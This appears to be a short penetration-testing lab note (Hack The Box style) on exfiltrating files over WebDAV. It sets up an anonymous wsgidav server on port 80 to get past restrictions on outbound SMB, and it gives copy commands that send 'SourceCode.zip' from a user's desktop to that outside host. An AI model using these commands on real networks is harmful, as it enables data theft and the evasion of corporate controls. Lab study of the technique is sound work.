Webdav
########

Date: 2024-11-02 19:06

Status:


Description
************

Sometimes connecting to SMB shares outside of the network is restricted
by corporate policy. However, for employee productivity ports 443 and 80
are left open. You can leverage this by using WEBDAV. It allows
directories to be accessible through HTTP.

2 modules in Python can be installed to allow this:

-  wsgidav
-  cheroot

and can be installed with:

.. code-block:: console

   sudo pip3 install wsgidav cheroot

And used as:

.. code-block:: console

   sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous 

Connecting to the share from powershell:

.. code-block:: console

   dir \\192.168.49.128\DavWWWRoot

**Note:** ``DavWWWRoot`` is a special keyword recognized by the Windows
Shell. No such folder exists on your WebDAV server. The DavWWWRoot
keyword tells the Mini-Redirector driver, which handles WebDAV requests
that you are connecting to the root of the WebDAV server.

You can avoid using this keyword if you specify a folder that exists on
your server when connecting to the server. For example:
\\192.168.49.128:raw-latex:`\sharefolder`

And finally upload files by:

.. code-block:: console

   C:\htb> copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\
   C:\htb> copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\sharefolder\

References
************
